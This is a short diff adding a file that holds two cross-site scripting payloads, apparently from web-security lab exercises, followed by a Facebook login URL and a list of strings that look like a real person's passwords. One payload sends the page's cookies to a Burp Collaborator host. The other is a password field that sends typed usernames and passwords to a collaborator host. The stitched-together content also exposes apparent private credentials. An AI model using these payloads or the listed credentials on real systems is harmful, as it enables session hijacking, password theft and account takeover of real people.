@@ -1,0 +1,23 @@
+<script>
+fetch("https://lpe9fuh41w0babh5l12vozow9nfd32.burpcollaborator.net", {
+	method: 'POST',
+	mode: 'no-cors',
+	body: document.cookie
+});
+</script>
+
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+
+
+https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348131
+
+nankyawt09269193939
+nankyawtlay09269193939
+NanKyawt1721992
+kyithar1992
+nankyawt17292
